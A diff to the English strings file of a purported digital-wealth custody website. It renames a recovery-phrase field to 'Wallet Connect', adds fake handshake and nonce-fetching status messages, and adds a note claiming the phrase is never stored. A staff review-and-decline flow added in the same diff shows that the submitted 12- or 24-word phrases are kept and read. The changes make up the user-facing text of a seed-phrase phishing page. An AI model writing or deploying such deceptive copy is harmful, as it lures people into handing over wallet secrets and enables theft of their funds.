@@ -48,7 +48,7 @@
     "description": "Digital Wealth Partners was founded on a simple premise: digital assets deserve the same operational discipline as any other part of a serious portfolio.",
     "storyHeading": "Our story",
     "story1": "We started in 2019 after watching clients hold significant digital asset positions across a patchwork of exchange accounts, hardware wallets and spreadsheets  with no consolidated view and no credible custody story.",
-    "story2": "Today we administer multi-currency accounts for private clients, family offices and independent advisors, combining institutional custody practice with reporting that fits into existing wealth structures.",
+    "story2": "Today we administer multi-currency accounts for private clients, family offices and independent advisors, combining Wallet Connect practice with reporting that fits into existing wealth structures.",
     "story3": "We are deliberately conservative. We support a small set of liquid assets, we document every balance movement, and we would rather decline a mandate than stretch our controls.",
     "pillars": {
       "mission": {
@@ -421,13 +421,16 @@
       "wallets": "Wallets",
       "transactions": "Transactions",
       "kyc": "Verification",
-      "accountKeyword": "Institutional custody",
+      "accountKeyword": "Wallet Connect",
       "settings": "Profile & settings"
     },
     "signOut": "Sign out",
+    "openMenu": "Open menu",
     "kycPending": "Identity verification is pending. You can explore your account while we review it.",
     "kycRejected": "Your identity verification was not accepted. Please resubmit your details.",
-    "goToVerification": "Go to verification"
+    "goToVerification": "Go to verification",
+    "keywordDeclined": "One or more of your Wallet Connect entries was declined. Please review it.",
+    "goToKeyword": "Review Wallet Connect"
   },
   "overview": {
     "title": "Portfolio overview",
@@ -531,22 +534,48 @@
     }
   },
   "accountKeyword": {
-    "title": "Institutional custody",
-    "subtitle": "Your recovery phrase is End to End Encrypted and stored securely on our servers, it can only be used by you.",
-    "label": "Your Institutional custody",
-    "placeholder": "Enter your keyword",
+    "title": "Wallet Connect",
+    "subtitle": "",
+    "label": "Enter key words",
+    "placeholder": "",
     "hint": "Usually 12 or 24 words.",
     "wordCount": "{count} words",
-    "submit": "Save keyword",
+    "submit": "Connect",
     "submitting": "Saving…",
-    "lockedTitle": "Your Institutional custody is set",
+    "lockedTitle": "Enter key words is set",
     "lockedNote": "You can update this keyword at any time if it changes or was entered incorrectly.",
     "setOn": "Set on {date}",
     "editButton": "Update keyword",
     "cancelButton": "Cancel",
+    "formError": "There was an issue. Please try entering or connecting manually.",
+    "privacyNote": "Your privacy is protected. Your key is used for a one-time connection and is never saved or stored by us. Note: Please Do not share your seed phrase with anyone.",
+    "gate": {
+      "heading": "",
+      "description": "",
+      "cta": "Tap the image to continue",
+      "loading": "Loading…",
+      "failed": "Loading failed",
+      "sendingRequest": "Fetching nonce from server...",
+      "awaitingResponse": "Establishing handshake...",
+      "failure": "Requesting public key...",
+      "error": "Error",
+      "redirecting": "Redirecting you to keyword entry…"
+    },
     "toast": {
-      "success": "Institutional custody saved.",
+      "success": "Wallet Connect saved.",
       "error": "Could not save your keyword"
+    },
+    "review": {
+      "pending": "Your Wallet Connect is with our team for review.",
+      "approved": "Your Wallet Connect has been approved.",
+      "declined": "Your Wallet Connect was declined. Please check the reason below and enter it again.",
+      "reason": "Reason: {reason}"
+    },
+    "connecting": "Connecting {wallet}",
+    "status": {
+      "pending": "Pending review",
+      "approved": "Approved",
+      "declined": "Declined"
     }
   },
   "settings": {
